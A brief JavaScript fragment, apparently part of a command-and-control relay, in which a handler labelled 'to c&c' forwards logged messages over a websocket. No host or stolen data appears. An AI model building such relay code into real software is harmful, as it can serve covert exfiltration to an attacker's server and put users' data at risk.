function(msg) {
                dbg('to c&c', msg);
                switch (msg.cmd) {
                    case 'log':
                        ws.send(JSON.stringify({cmd:'post', p: msg.p}));
                    break;
                }
            }